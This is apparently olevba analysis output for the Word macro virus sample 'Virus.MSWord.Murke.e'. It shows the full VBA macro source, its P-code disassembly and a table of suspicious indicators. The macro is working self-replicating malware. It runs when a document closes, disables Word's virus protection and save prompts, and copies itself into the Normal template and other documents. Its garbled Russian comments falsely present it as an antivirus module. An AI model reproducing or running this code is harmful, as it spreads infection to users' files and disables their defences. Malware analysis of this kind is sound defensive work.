olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Murke.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Murke.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'*************************************************************************
'Murka - Ýòî ñàìûé ìàëåíüêèé èç âñåõ èçâåñòíûõ ÌàêðîÀíòèâèðóñíûõ ìîäóëåé!
'Ïðèíöèï äåéñòâèÿ: Çàãðóæàåòñÿ âìåñòå ñ äîêóìåíòîì è áëîêèðóåò
'                 ðàñïðîñòðàíåíèå çàðàæåííûõ ìîäóëåé
'
'Óñëîâèÿ ðàñïðîñòðàíåíèÿ: Freeware(Ñâîáîäíî)
'Äîñòîèíñòâà:             Êîððåêòíàÿ ðàáîòà, íàäåæíîñòü!
'Íåäîñòàòêè:              Ïîêà íå íàøåë
'
'"Âñå ýòî, êîíå÷íî, õîðîøî, íî ÿ íè õðåíà íå ïîíÿë, êàê åãî
' ìîæíî ïðåîáðåñòè?!" - ãíåâíî ñêàæåøü òû. Ìîæíî!
'Äåä MustDie âàì âñå ðàñêàæåò!
'Íåîáõîäèìî ëèøü îòêðûòü äîêóìåíò íà ïåðñîíàëüíîì
'êîìïå. ãäå óæå óñòàíîâëåí àíòèâèðóñíûé ìîäóëü Murka.
'
'Àâòîðó:   mustdie@chat.ru
'Murke:    murka@chat.ru
'Äàíèëîâó: antivir@dials.ru
'*************************************************************************
On Error Resume Next
Dim s As Boolean
Dim i As Long
Dim j As Long
Dim Murka As String
Dim Other As String
Dim str As String
  s = ActiveDocument.Saved
  Application.EnableCancelKey = wdCancelDisabled
  With Options: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
  str = "Document_Close"
  With MacroContainer.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Murka = .Lines(i, j)
  End With
  With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Other = .Lines(i, j)
    If Other <> Murka And Murka <> "" Then
      .DeleteLines i, j
      .InsertLines 1, Murka
      NormalTemplate.Save
    End If
  End With
  With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    i = .ProcBodyLine(str, vbext_pk_Proc)
    j = .ProcCountLines(str, vbext_pk_Proc)
    Other = .Lines(i, j)
    If Other <> Murka And Murka <> "" Then
      .DeleteLines i, j
      .InsertLines 1, Murka
      Randomize
      If Rnd < 0.300000007450581 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Murka3": .Author = "M&M": .Execute: End With
      If Left(ActiveDocument.Name, 8) = "Document" Or Left(ActiveDocument.Name, 8) = "Äîêóìåíò" Then
      Else
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
      End If
    End If
  End With
  If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Murke.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5238 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x0049 "*************************************************************************"
' Line #2:
' 	QuoteRem 0x0000 0x0048 "Murka - Ýòî ñàìûé ìàëåíüêèé èç âñåõ èçâåñòíûõ ÌàêðîÀíòèâèðóñíûõ ìîäóëåé!"
' Line #3:
' 	QuoteRem 0x0000 0x003D "Ïðèíöèï äåéñòâèÿ: Çàãðóæàåòñÿ âìåñòå ñ äîêóìåíòîì è áëîêèðóåò"
' Line #4:
' 	QuoteRem 0x0000 0x0033 "                 ðàñïðîñòðàíåíèå çàðàæåííûõ ìîäóëåé"
' Line #5:
' 	QuoteRem 0x0000 0x0000 ""
' Line #6:
' 	QuoteRem 0x0000 0x002B "Óñëîâèÿ ðàñïðîñòðàíåíèÿ: Freeware(Ñâîáîäíî)"
' Line #7:
' 	QuoteRem 0x0000 0x0037 "Äîñòîèíñòâà:             Êîððåêòíàÿ ðàáîòà, íàäåæíîñòü!"
' Line #8:
' 	QuoteRem 0x0000 0x0026 "Íåäîñòàòêè:              Ïîêà íå íàøåë"
' Line #9:
' 	QuoteRem 0x0000 0x0000 ""
' Line #10:
' 	QuoteRem 0x0000 0x003A ""Âñå ýòî, êîíå÷íî, õîðîøî, íî ÿ íè õðåíà íå ïîíÿë, êàê åãî"
' Line #11:
' 	QuoteRem 0x0000 0x0030 " ìîæíî ïðåîáðåñòè?!" - ãíåâíî ñêàæåøü òû. Ìîæíî!"
' Line #12:
' 	QuoteRem 0x0000 0x001D "Äåä MustDie âàì âñå ðàñêàæåò!"
' Line #13:
' 	QuoteRem 0x0000 0x0030 "Íåîáõîäèìî ëèøü îòêðûòü äîêóìåíò íà ïåðñîíàëüíîì"
' Line #14:
' 	QuoteRem 0x0000 0x0034 "êîìïå. ãäå óæå óñòàíîâëåí àíòèâèðóñíûé ìîäóëü Murka."
' Line #15:
' 	QuoteRem 0x0000 0x0000 ""
' Line #16:
' 	QuoteRem 0x0000 0x0019 "Àâòîðó:   mustdie@chat.ru"
' Line #17:
' 	QuoteRem 0x0000 0x0017 "Murke:    murka@chat.ru"
' Line #18:
' 	QuoteRem 0x0000 0x001A "Äàíèëîâó: antivir@dials.ru"
' Line #19:
' 	QuoteRem 0x0000 0x0049 "*************************************************************************"
' Line #20:
' 	OnError (Resume Next) 
' Line #21:
' 	Dim 
' 	VarDefn s (As Boolean)
' Line #22:
' 	Dim 
' 	VarDefn i (As Long)
' Line #23:
' 	Dim 
' 	VarDefn j (As Long)
' Line #24:
' 	Dim 
' 	VarDefn Murka (As String)
' Line #25:
' 	Dim 
' 	VarDefn Other (As String)
' Line #26:
' 	Dim 
' 	VarDefn str (As String)
' Line #27:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #28:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #29:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	EndWith 
' Line #30:
' 	LitStr 0x000E "Document_Close"
' 	St str 
' Line #31:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #32:
' 	Ld str 
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcBodyLine 0x0002 
' 	St i 
' Line #33:
' 	Ld str 
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcCountLines 0x0002 
' 	St j 
' Line #34:
' 	Ld i 
' 	Ld j 
' 	ArgsMemLdWith Lines 0x0002 
' 	St Murka 
' Line #35:
' 	EndWith 
' Line #36:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #37:
' 	Ld str 
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcBodyLine 0x0002 
' 	St i 
' Line #38:
' 	Ld str 
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcCountLines 0x0002 
' 	St j 
' Line #39:
' 	Ld i 
' 	Ld j 
' 	ArgsMemLdWith Lines 0x0002 
' 	St Other 
' Line #40:
' 	Ld Other 
' 	Ld Murka 
' 	Ne 
' 	Ld Murka 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #41:
' 	Ld i 
' 	Ld j 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #42:
' 	LitDI2 0x0001 
' 	Ld Murka 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #43:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	EndWith 
' Line #46:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #47:
' 	Ld str 
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcBodyLine 0x0002 
' 	St i 
' Line #48:
' 	Ld str 
' 	Ld vbext_pk_Proc 
' 	ArgsMemLdWith ProcCountLines 0x0002 
' 	St j 
' Line #49:
' 	Ld i 
' 	Ld j 
' 	ArgsMemLdWith Lines 0x0002 
' 	St Other 
' Line #50:
' 	Ld Other 
' 	Ld Murka 
' 	Ne 
' 	Ld Murka 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #51:
' 	Ld i 
' 	Ld j 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #52:
' 	LitDI2 0x0001 
' 	Ld Murka 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #53:
' 	ArgsCall Read 0x0000 
' Line #54:
' 	Ld Rnd 
' 	LitR8 0x333A 0x3B33 0x3333 0x3FD3 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' 	LitStr 0x0006 "Murka3"
' 	MemStWith Title 
' 	BoS 0x0000 
' 	LitStr 0x0003 "M&M"
' 	MemStWith Author 
' 	BoS 0x0000 
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' 	EndWith 
' 	EndIf 
' Line #55:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #56:
' 	ElseBlock 
' Line #57:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	EndWith 
' Line #61:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #62:
' 	EndSub 
' Line #63:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

